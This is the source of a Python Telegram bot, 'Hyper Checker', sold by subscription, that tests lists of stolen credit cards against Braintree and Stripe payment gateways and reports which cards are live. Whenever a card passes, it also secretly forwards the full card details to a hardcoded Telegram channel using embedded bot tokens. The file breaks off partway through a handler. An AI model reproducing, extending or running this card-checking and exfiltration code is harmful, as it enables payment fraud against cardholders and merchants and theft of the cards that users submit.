import telebot,os
import re,json
import requests
import telebot,time,random
import random
import string
from telebot import types
from gatet import *
from reg import reg
from datetime import datetime, timedelta
from faker import Faker
from multiprocessing import Process
import threading
stopuser = {}
token = '7147058861:AAF2EkuHS-LzkUdudvU2xWx0MD0SNZsUtNY'
bot=telebot.TeleBot(token,parse_mode="HTML")
admin=1718738592
f = Faker()
name = f.name()
street = f.address()
city = f.city()
state = f.state()
postal = f.zipcode()
phone = f.phone_number()
coun = f.country()
mail = f.email()
command_usage = {}
def reset_command_usage():
	for user_id in command_usage:
		command_usage[user_id] = {'count': 0, 'last_time': None}
@bot.message_handler(commands=["start"])
def start(message):
	def my_function():
		gate=''
		name = message.from_user.first_name
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		id=message.from_user.id
		
		try:BL=(json_data[str(id)]['plan'])
		except:
			BL='𝗙𝗥𝗘𝗘'
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			new_data = {
				id : {
	  "plan": "𝗙𝗥𝗘𝗘",
	  "timer": "none",
				}
			}
	
			existing_data.update(new_data)
			with open('data.json', 'w') as json_file:
				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
		if BL == '𝗙𝗥𝗘𝗘':	
			keyboard = types.InlineKeyboardMarkup()
			ahmedhusien = types.InlineKeyboardMarkup(row_width=1)
			ahmed = types.InlineKeyboardButton(text="𝗢𝗪𝗡𝗘𝗥", url="https://t.me/lakshayfr")
			contact_button = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/hypermpshop")
			keyboard.add(contact_button, ahmed)
			video_url = f'https://t.me/LakshayKaProBot/2'
			bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
   
Hello Welcome to Hyper Checker\n
Status-ALIVE\n
Use /cmds TO KNOW COMMANDS\n
YOUR CURRENT PLAN IS :  {BL}</b>
	''',reply_markup=keyboard)
			return
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="𝗢𝗪𝗡𝗘𝗥", url="https://t.me/lakshayfr")
		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/hypermpshop")
		keyboard.add(contact_button, ahmed)
		username = message.from_user.first_name
		random_number = random.randint(33, 82)
		video_url = f'https://t.me/LakshayKaProBot/2'
		bot.send_video(chat_id=message.chat.id, video=video_url, caption='''𝘾𝙡𝙞𝙘𝙠 /cmds 𝙏𝙤 𝙑𝙞𝙚𝙬 𝙏𝙝𝙚 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨 𝙊𝙧 𝙎𝙚𝙣𝙙 𝙏𝙝𝙚 𝙁𝙞𝙡𝙚 𝘼𝙣𝙙 𝙄 𝙒𝙞𝙡𝙡 𝘾𝙝𝙚𝙘𝙠 𝙄𝙩''',reply_markup=keyboard)
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(commands=["cmds"])
def start(message):
	with open('data.json', 'r') as file:
		json_data = json.load(file)
	id=message.from_user.id
	try:BL=(json_data[str(id)]['plan'])
	except:
		BL='𝗙𝗥𝗘𝗘'
	name = message.from_user.first_name
	keyboard = types.InlineKeyboardMarkup()
	contact_button = types.InlineKeyboardButton(text=f"✨ {BL}  ✨",callback_data='plan')
	keyboard.add(contact_button)
	bot.send_message(chat_id=message.chat.id, text=f'''<b> 
COMMANDS FOR THE BOT : 
━━━━━━━━━━━━
𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛 > <code>/chk number|mm|yy|cvc</code>
𝗦𝗧𝗔𝗧𝗨𝗦 𝗢𝗡𝗟𝗜𝗡𝗘 ✅
━━━━━━━━━━━━
3𝗗 𝗟𝗢𝗢𝗞𝗨𝗣 > <code>/vbv number|mm|yy|cvc</code>
𝗢𝗡𝗟𝗜𝗡𝗘 ✅
MUST JOIN @HyperCheckerUpdates 
</b>
''',reply_markup=keyboard)
@bot.message_handler(content_types=["document"])
def main(message):
		name = message.from_user.first_name
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		id=message.from_user.id
		
		try:BL=(json_data[str(id)]['plan'])
		except:
			BL='𝗙𝗥𝗘𝗘'
		if BL == '𝗙𝗥𝗘𝗘':
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			new_data = {
				id : {
	  "plan": "𝗙𝗥𝗘𝗘",
	  "timer": "none",
				}
			}
	
			existing_data.update(new_data)
			with open('data.json', 'w') as json_file:
				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
			keyboard = types.InlineKeyboardMarkup()
			contact_button = types.InlineKeyboardButton(text="𝗢𝗪𝗡𝗘𝗥", url="https://t.me/lakshayfr")
			ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/hypermpshop")
			keyboard.add(contact_button, ahmed)
			bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
OH, SEEMS LIKE YOU DO NOT HAVE ANY ACTIVE SUBSCRIPTION {BL}</b>
''',reply_markup=keyboard)
			return
		with open('data.json', 'r') as file:
			json_data = json.load(file)
			date_str=json_data[str(id)]['timer'].split('.')[0]
		try:
			provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
		except Exception as e:
			keyboard = types.InlineKeyboardMarkup()
			ahmed = types.InlineKeyboardButton(text="𝗢𝗪𝗡𝗘𝗥", url="https://t.me/lakshayfr")
			contact_button = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/hypermpshop")
			keyboard.add(contact_button, ahmed)
			bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
Hello Welcome to Hyper Checker

Status-ALIVE

Use /cmds TO KNOW COMMANDS

YOUR CURRENT PLAN IS :  {BL}</b>
''',reply_markup=keyboard)
			return
		current_time = datetime.now()
		required_duration = timedelta(hours=0)
		if current_time - provided_time > required_duration:
			keyboard = types.InlineKeyboardMarkup()
			ahmed = types.InlineKeyboardButton(text="𝗢𝗪𝗡𝗘𝗥", url="https://t.me/lakshayfr")
			contact_button = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/hypermpshop")
			keyboard.add(contact_button, ahmed)
			bot.send_message(chat_id=message.chat.id, text=f'''YOUR SSUBSCRIPTION HAS BEEN EXPIRED!</b>
		''',reply_markup=keyboard)
			with open('data.json', 'r') as file:
				json_data = json.load(file)
			json_data[str(id)]['timer'] = 'none'
			json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
			with open('data.json', 'w') as file:
				json.dump(json_data, file, indent=2)
			return
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text=f"🏴‍☠️ 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛 🏴‍☠️",callback_data='br')
		sw = types.InlineKeyboardButton(text=f" 𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘 🪽 (off) ",callback_data='str')
		keyboard.add(contact_button)
		keyboard.add(sw)
		bot.reply_to(message, text=f'𝘾𝙝𝙤𝙤𝙨𝙚 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 𝙔𝙤𝙪 𝙒𝙖𝙣𝙩 𝙏𝙤 𝙐𝙨𝙚',reply_markup=keyboard)
		ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
		with open("combo.txt", "wb") as w:
			w.write(ee)
@bot.callback_query_handler(func=lambda call: call.data == 'str')
def menu_callback(call):
	def my_function():
		id=call.from_user.id
		gate='stripe charge'
		dd = 0
		live = 0
		ch = 0
		ccnn = 0
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= "LETTING THE MAGIC HAPPEN...⌛")
		try:
			with open("combo.txt", 'r') as file:
				lino = file.readlines()
				total = len(lino)
				try:
					stopuser[f'{id}']['status'] = 'start'
				except:
					stopuser[f'{id}'] = {
				'status': 'start'
			}
				for cc in lino:
					if stopuser[f'{id}']['status'] == 'stop':
						bot.edit_message_text(chat_id=call.chat.id, message_id=ko, text=' MAGIC STOPPED ✅\nDEV ➜ @lakshayfr')
						return
					try:
						data = requests.get('https://binlist.io/lookup/'+cc[:6]).json()
					except:
						pass
					try:
					    level=(data['level'])
					except:
					    level=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						bank=(data['bank']['name'])
					except:
						bank=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						country_flag=(data['country']['emoji'])
					except:
						country_flag=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						country=(data['country']['name'])
					except:
						country=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						brand=(data['scheme'])
					except:
						brand=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						card_type=(data['type'])
					except:
						card_type=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						url=(data['bank']['url'])
					except:
						url=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					
					start_time = time.time()
					try:
						last = str(st(cc))
					except Exception as e:
						print(e)
						last = "يتم العمل علي تحديثات الوابة"
					if 'risk' in last:
						last='declined'
					elif 'Duplicate' in last:
						last='live'
					mes = types.InlineKeyboardMarkup(row_width=1)
					cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
					status = types.InlineKeyboardButton(f"• 𝙎𝙏𝘼𝙏𝙐𝙎 ➜ {last} •", callback_data='u8')
					cm3 = types.InlineKeyboardButton(f"• 𝑪𝑯𝑨𝑹𝑮𝑬 ✅ ➜ [ {ch} ] •", callback_data='x')
					ccn = types.InlineKeyboardButton(f"• 𝘾𝘾𝙉 ☑️ ➜ [ {ccnn} ] •", callback_data='x')
					cm4 = types.InlineKeyboardButton(f"• 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌ ➜ [ {dd} ] •", callback_data='x')
					risk = types.InlineKeyboardButton(f"• 𝑰𝑵𝑺𝑼𝑭𝑭𝑰𝑪𝑰𝑬𝑵𝑻 𝑭𝑼𝑵𝑫𝑺 ☑️ ➜ [ {live} ] •", callback_data='x')
					cm5 = types.InlineKeyboardButton(f"• 𝙏𝙊𝙏𝘼𝙇 👻 ➜ [ {total} ] •", callback_data='x')
					stop=types.InlineKeyboardButton(f"[ 𝙎𝙏𝙊𝙋 ]", callback_data='stop')
					mes.add(cm1,status, cm3,ccn,risk, cm4, cm5, stop)
					end_time = time.time()
					execution_time = end_time - start_time
					bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text=f'''𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 𝙒𝙝𝙞𝙡𝙚 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨 𝘼𝙧𝙚 𝘽𝙚𝙞𝙣𝙜 𝘾𝙝𝙚𝙘𝙠 𝘼𝙩 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 {gate}
𝘽𝙤𝙩 𝘽𝙮 @lakshayfr''', reply_markup=mes)

					msg=f'''<b>𝑪𝑯𝑨𝑹𝑮𝑬 ✅
			- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {last}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @LAKSHAYFR
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
					msgc=f'''<b>𝑪𝑪𝑵 ☑️
			- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {last}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @lakshayfr
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
					msgf=f'''<b>𝑰𝑵𝑺𝑼𝑭𝑭𝑰𝑪𝑰𝑬𝑵𝑻 𝑭𝑼𝑵𝑫𝑺 ☑️
			- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {last}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @lakshayfr
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
					if 'success' in last:
						tok = '7494183761:AAESeN3NVjZ46XRUUFAQ120a1kNAB8pJCPo'
						acc =  '-1002246001656'
						mg = f"""<b> 
❆═══» LAKSHAY'S HITS  «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ {cc[:6]}
｢𝙸𝙽𝙵𝙾」➔ {brand} - {card_type} - {level}
｢𝙱𝙰𝙽𝙺」➔ {bank}
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» LAKSHAY'S HITS  «═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ 
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @lakshayfr  
</b>"""
						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
						tlg_params = {"parse_mode": "HTML"}

						i = requests.post(tlg, params=tlg_params)
						ch += 1
						bot.send_message(call.from_user.id, msg)
					elif "funds" in last:
						tok = '7494183761:AAESeN3NVjZ46XRUUFAQ120a1kNAB8pJCPo'
						acc =  '-1002246001656'
						mg = f"""<b> 
❆═══» LAKSHAY'S HITS  «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ {cc[:6]}
｢𝙸𝙽𝙵𝙾」➔ {brand} - {card_type} - {level}
｢𝙱𝙰𝙽𝙺」➔ {bank}
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» LAKSHAY'S HITS  «═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @lakshayfr
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @lakshayfr 
</b>"""
						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
						tlg_params = {"parse_mode": "HTML"}

						i = requests.post(tlg, params=tlg_params)
						bot.send_message(call.from_user.id, msgf)
						live+=1
					elif "card's security" in last:
						tok = '7494183761:AAESeN3NVjZ46XRUUFAQ120a1kNAB8pJCPo'
						acc =  '-1002246001656'
						mg = f"""<b> 
❆═══» LAKSHAY'S HITS  «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ {cc[:6]}
｢𝙸𝙽𝙵𝙾」➔ {brand} - {card_type} - {level}
｢𝙱𝙰𝙽𝙺」➔ {bank}
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» LAKSHAY'S HITS  «═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ 
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @lakshayfr
</b>"""
						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
						tlg_params = {"parse_mode": "HTML"}

						i = requests.post(tlg, params=tlg_params)
						ccnn+=1
						bot.send_message(call.from_user.id, msgc)
					else:
						dd += 1
					time.sleep(0)
		except Exception as e:
			print(e)
		stopuser[f'{id}']['status'] = 'start'
		bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text='MAGIC COMPLETED ✅\nDEV ➜ @lakshayfr')
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.callback_query_handler(func=lambda call: call.data == 'br')
def menu_callback(call):
	def my_function():
		id=call.from_user.id
		gate='Braintree Auth'
		dd = 0
		live = 0
		riskk = 0
		ccnn = 0
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= " LETTING THE MAGIC HAPPEN...⌛")
		try:
			with open("combo.txt", 'r') as file:
				lino = file.readlines()
				total = len(lino)
				try:
					stopuser[f'{id}']['status'] = 'start'
				except:
					stopuser[f'{id}'] = {
				'status': 'start'
			}
				for cc in lino:
					if stopuser[f'{id}']['status'] == 'stop':
						bot.edit_message_text(chat_id=call.chat.id, message_id=ko, text='MAGIC STOPPED ✅\nDEV ➜ @lakshayfr')
						return
					try:
						data = requests.get('https://binlist.io/lookup/'+cc[:6]).json()
						
						
					except:
						pass
					try:
						level=(data['level'])
					except:
												level=('UNABLE TO FETCH!')
					try:
						bank=(data['bank']['name'])
					except:
						bank=('UNABLE TO FETCH!')
					try:
						country_flag=(data['country']['emoji'])
					except:
						country_flag=('UNABLE TO FETCH!')
					try:
						country=(data['country']['name'])
					except:
						country=('UNABLE TO FETCH!')
					try:
						brand=(data['scheme'])
					except:
						brand=('UNABLE TO FETCH!')
					try:
						card_type=(data['type'])
					except:
						card_type=('UNABLE TO FETCH!')
					try:
						url=(data['bank']['url'])
					except:
						url=('UNABLE TO FETCH!')
					
					start_time = time.time()
					try:
						last = str(Tele(cc))
					except Exception as e:
						print(e)
						last = "ERROR"
					if 'risk' in last:
						last='declined'
					elif 'Duplicate' in last:
						last='Approved'
					mes = types.InlineKeyboardMarkup(row_width=1)
					cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
					status = types.InlineKeyboardButton(f"• 𝙎𝙏𝘼𝙏𝙐𝙎 ➜ {last} •", callback_data='u8')
					cm3 = types.InlineKeyboardButton(f"• MAGICAL APPROVED ✅ ➜ [ {live} ] •", callback_data='x')
					ccn = types.InlineKeyboardButton(f"• CCNS ☑️ ➜ [ {ccnn} ] •", callback_data='x')
					cm4 = types.InlineKeyboardButton(f"• DECLINED ❌ ➜ [ {dd} ] •", callback_data='x')
					risk = types.InlineKeyboardButton(f"• RISK 🏴‍☠️ ➜ [ {riskk} ] •", callback_data='x')
					cm5 = types.InlineKeyboardButton(f"• TOTAL CCS 👻 ➜ [ {total} ] •", callback_data='x')
					stop=types.InlineKeyboardButton(f"[ STOP THE MAGIC ]", callback_data='stop')
					mes.add(cm1,status, cm3,ccn,risk, cm4, cm5, stop)
					end_time = time.time()
					execution_time = end_time - start_time
					bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text=f'''PLEASE WAIT YOUR CARDS ARE BEING CHECKED :  {gate}
𝘽𝙤𝙩 𝘽𝙮 @lakshayfr''', reply_markup=mes)
					
					msg=f''' HITS (APPROVED) ✅
			
𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ <code>{country} - {country_flag}</code> 
𝘽𝙞𝙣 ➼ <code>{cc[:6]} - {card_type} - {brand}</code>
𝙄𝙨𝙨𝙪𝙚𝙧 ➼ <code>{bank}</code>
𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
𝗕𝗼𝘁 𝗕𝘆: @lakshayfr'''
					msgc=f''' 𝘾𝘾𝙉 ☑️
			
𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ <code>{country} - {country_flag}</code> 
𝘽𝙞𝙣 ➼ <code>{cc[:6]} - {card_type} - {brand}</code>
𝙄𝙨𝙨𝙪𝙚𝙧 ➼ <code>{bank}</code>
𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
𝗕𝗼𝘁 𝗕𝘆: @lakshayfr'''

					if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'Approved' in last:
						tok ='7103663429:AAHshq4iqHzboZucTQnhO3EqZ7akeews--E'
						acc =  '-1002246001656'
						mg = f"""<b> 
❆═══» LAKSHAY'S HITS  «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ <code>{cc[:6]}</code>
｢𝙸𝙽𝙵𝙾」➔ <code>{brand} - {card_type} - {level}</code>
｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» LAKSHAY'S HITS  «═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ 
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @lakshayfr
</b>"""
						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
						tlg_params = {"parse_mode": "HTML"}

						i = requests.post(tlg, params=tlg_params)
						live += 1
						bot.send_message(call.from_user.id, msg)
					elif 'risk' in last:
						risk+=1
						bot.send_message(call.from_user.id, risk)
					elif 'CVV' in last:
						tok = '7494183761:AAESeN3NVjZ46XRUUFAQ120a1kNAB8pJCPo'
						acc =  '-1002246001656'
						mg = f"""<b> 
❆═══» LAKSHAY'S HITS  «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ <code>{cc[:6]}</code>
｢𝙸𝙽𝙵𝙾」➔ <code>{brand} - {card_type} - {level}</code>
｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» LAKSHAY'S HITS  «═══❆
 
</b>"""
						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
						tlg_params = {"parse_mode": "HTML"}

						i = requests.post(tlg, params=tlg_params)
						ccnn+=1
						bot.send_message(call.from_user.id, msgc)
					else:
						dd += 1
					time.sleep(0)
		except Exception as e:
			print(e)
		stopuser[f'{id}']['status'] = 'start'
		bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text= ' MAGIC STOPPED ✅\nDEV ➜ @lakshayfr')
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(func=lambda message: message.text.lower().startswith('.au') or message.text.lower().startswith('/au'))
def respond_to_vbv(message):
	gate='stripe Auth'
	name = message.from_user.first_name
	idt=message.from_user.id
	id=message.chat.id
	with open('data.json', 'r') as json_file:
		json_data = json.load(json_file)

	try:BL=(json_data[str(idt)]['plan'])
	except:
		with open('data.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
			id : {
  "plan": "𝗙𝗥𝗘𝗘",
  "timer": "none",
			}
		}
		existing_data.update(new_data)
		with open('data.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
		BL='𝗙𝗥𝗘𝗘'
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ DEV  ✨", url="https://t.me/lakshayfr")
		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/hypermpshop")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>HII {name}
 Welcome to Hyper Checker
 
Status-ALIVE

Use /cmds TO KNOW COMMANDS 

your current plan is :{BL}</b>
''',reply_markup=keyboard)
		return
	with open('data.json', 'r') as file:
		json_data = json.load(file)
		date_str=json_data[str(id)]['timer'].split('.')[0]
	try:
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
	except Exception as e:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ DEV  ✨", url="https://t.me/lakshayfr")
		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/hypermpshop")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>HII {name}
 Welcome to Hyper Checker

Status-ALIVE

Use /cmds TO KNOW COMMANDS 

YOUR CURRENT PLAN IS : {BL}</b>
''',reply_markup=keyboard)
		return
	current_time = datetime.now()
	required_duration = timedelta(hours=0)
	if current_time - provided_time > required_duration:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ DEV  ✨", url="https://t.me/lakshayfr")
		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/hypermpshop")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b> OH , YOUR SUBSCRIPTION HAS EXPIRED </b>
	''',reply_markup=keyboard)
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		json_data[str(id)]['timer'] = 'none'
		json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		return
	try:command_usage[idt]['last_time']
	except:command_usage[idt] = {
				'last_time': datetime.now()
			}
	if command_usage[idt]['last_time'] is not None:
		time_diff = (current_time - command_usage[idt]['last_time']).seconds
		if time_diff < 30:
			bot.reply_to(message, f"<b>Try again after {30-time_diff} seconds.</b>",parse_mode="HTML")
			return	
	ko = (bot.reply_to(message, "LETTING THE MAGIC HAPPEN...✨").message_id)
	try:
		cc = message.reply_to_message.text
	except:
		cc=message.text
	cc=str(reg(cc))
	if cc == 'None':
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		return
	start_time = time.time()
	try:
		command_usage[idt]['last_time'] = datetime.now()
		last = str(scc(cc))
	except Exception as e:
		last='Error'
	try: data = requests.get('https://binlist.io/lookup/'+cc[:6]).json()
	except: pass
	try:
		level = data['level']
	except:
		level = 'Unknown'
	try:
		brand = data['brand']
	except:
		brand = 'Unknown'
	try:
		card_type = data['type']
	except:
		card_type = 'Unknown'
	try:
		country = data['country']
		country_flag = data['country_flag']
	except:
		country = 'Unknown'
		country_flag = 'Unknown'
	try:
		bank = data['bank']
	except:
		bank = 'Unknown'
	end_time = time.time()
	execution_time = end_time - start_time
	msg=f''' HITS (APPROVED) ✅ 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {last}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]}</code> - <code>{card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @lakshayfr
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
	msgd=f'''<b>DECLINED ❌
			- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {last}
